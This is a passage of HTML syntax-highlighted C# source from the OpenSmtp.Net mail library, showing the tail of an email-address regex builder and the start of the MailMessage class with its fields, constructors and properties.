                </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" | "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">quoted_str</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" )"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">phrase_char</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" *"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")*"</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc2">// A mailbox is an addr_spec or a phrase/route_addr
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?'mailbox'"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addr_spec</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"|"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">route_addr</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")"</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">_addressRegex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc11">mailbox</span><span class="sc10">,</span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">Compiled</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">IgnorePatternWhitespace</span><span class="sc10">);</span><span class="sc0">       

        </span><span class="sc10">}</span><span class="sc0">



    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Specialized</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type stores the addresses, attachments, body, subject,
</span><span class="sc0">    </span><span class="sc15">/// and properties of the email message. There can be many
</span><span class="sc0">    </span><span class="sc15">/// attachments and email addresses in each MailMessage.
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="EmailAddress"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="Attachment"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;remarks&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type stores the addresses, attachments, body, subject,
</span><span class="sc0">    </span><span class="sc15">/// and properties of the email message. There can be many
</span><span class="sc0">    </span><span class="sc15">/// attachments and email addresses in each MailMessage.
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="EmailAddress"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="Attachment"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/remarks&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">    </span><span class="sc15">///     from            = new EmailAddress("support@OpenSmtp.com", "Support");
</span><span class="sc0">    </span><span class="sc15">///     to              = new EmailAddress("recipient@OpenSmtp.com", "Joe Smith");
</span><span class="sc0">    </span><span class="sc15">///     cc              = new EmailAddress("cc@OpenSmtp.com", "CC Name");
</span><span class="sc0">    </span><span class="sc15">///
</span><span class="sc0">    </span><span class="sc15">///     msg             = new MailMessage(from, to);
</span><span class="sc0">    </span><span class="sc15">///     msg.AddRecipient(cc, AddressType.Cc);
</span><span class="sc0">    </span><span class="sc15">///     msg.AddRecipient("bcc@OpenSmtp.com", AddressType.Bcc);
</span><span class="sc0">    </span><span class="sc15">///
</span><span class="sc0">    </span><span class="sc15">///     msg.Subject     = "Testing OpenSmtp .Net SMTP component";
</span><span class="sc0">    </span><span class="sc15">///     msg.Body        = "Hello Joe Smith.";
</span><span class="sc0">    </span><span class="sc15">///     msg.HtmlBody    = "&lt;html&gt;&lt;body&gt;Hello Joe Smith.&lt;/body&gt;&lt;/html&gt;";
</span><span class="sc0">    </span><span class="sc15">///
</span><span class="sc0">    </span><span class="sc15">///     // mail message properties
</span><span class="sc0">    </span><span class="sc15">///     msg.Charset     = "ISO-8859-1";
</span><span class="sc0">    </span><span class="sc15">///     msg.Priority    = MailPriority.High;
</span><span class="sc0">    </span><span class="sc15">///     msg.Notification = true;
</span><span class="sc0">    </span><span class="sc15">///
</span><span class="sc0">    </span><span class="sc15">///     // add custom headers
</span><span class="sc0">    </span><span class="sc15">///     msg.AddCustomHeader("X-CustomHeader", "Value");
</span><span class="sc0">    </span><span class="sc15">///     msg.AddCustomHeader("X-CompanyName", "Value");
</span><span class="sc0">    </span><span class="sc15">///
</span><span class="sc0">    </span><span class="sc15">///     // add attachments
</span><span class="sc0">    </span><span class="sc15">///     msg.AddAttachment(@"..\attachments\test.jpg");
</span><span class="sc0">    </span><span class="sc15">///     msg.AddAttachment(@"..\attachments\test.htm");
</span><span class="sc0">    </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc0">           </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc0">           </span><span class="sc11">replyTo</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0">              </span><span class="sc11">recipientList</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0">              </span><span class="sc11">ccList</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0">              </span><span class="sc11">bccList</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0">              </span><span class="sc11">attachments</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">body</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">htmlBody</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">mixedBoundary</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">altBoundary</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">relatedBoundary</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">charset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"ISO-8859-1"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0">                   </span><span class="sc11">notification</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">                 </span><span class="sc11">priority</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0">              </span><span class="sc11">customHeaders</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0">              </span><span class="sc11">images</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">recipientList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">ccList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">bccList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">attachments</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">images</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">customHeaders</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">.</span><span class="sc11">generateMixedMimeBoundary</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">.</span><span class="sc11">generateAltMimeBoundary</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">relatedBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">.</span><span class="sc11">generateRelatedMimeBoundary</span><span class="sc10">();</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Constructor using EmailAddress type&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     EmailAddress from   = new EmailAddress("support@OpenSmtp.com", "Support");
</span><span class="sc0">        </span><span class="sc15">///     EmailAddress to     = new EmailAddress("recipient@OpenSmtp.com", "Joe Smith");
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg     = new MailMessage(from, to);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">(</span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">sender</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">recipient</span><span class="sc10">):</span><span class="sc5">this</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">from</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sender</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">recipientList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">recipient</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Constructor using string email addresses&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">senderAddress</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">recipientAddress</span><span class="sc10">):</span><span class="sc5">this</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">(</span><span class="sc11">senderAddress</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">(</span><span class="sc11">recipientAddress</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{}</span><span class="sc0">


        </span><span class="sc2">// -------------------------- Properties --------------------------
</span><span class="sc0">
        </span><span class="sc15">/// &lt;value&gt;Stores the EmailAddress to Reply-To.
</span><span class="sc0">        </span><span class="sc15">/// If no EmailAddress is specified the From address is used.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">replyTo</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">replyTo</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">replyTo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the EmailAddress of the sender&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">From</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the EmailAddress of the recipient&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">To</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">recipientList</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">recipientList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the subject of the MailMessage&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Subject</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the text body of the MailMessage&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Body</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the HTML body of the MailMessage&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">HtmlBody</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">htmlBody</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">htmlBody</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores Mail Priority value&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;seealso&gt;MailPriority&lt;/seealso&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Priority</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">priority</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">priority</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc15">/// &lt;value&gt;Stores the Read Confirmation Reciept&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">Notification</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">notification</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">notification</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores an ArrayList of CC EmailAddresses&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">CC</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ccList</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">ccList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores an ArrayList of BCC EmailAddresses&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">BCC</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">bccList</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">bccList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the character set of the MailMessage&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Charset</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores a list of Attachments&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">Attachments</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">attachments</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">attachments</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores a NameValueCollection of custom headers&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">CustomHeaders</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">customHeaders</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">customHeaders</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the string boundary used between MIME parts&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">AltBoundary</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">altBoundary</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

         </span><span class="sc15">/// &lt;value&gt;Stores the string boundary used between MIME parts&lt;/value&gt;
</span><span class="sc0">         </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">MixedBoundary</span><span class="sc0">
         </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">mixedBoundary</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
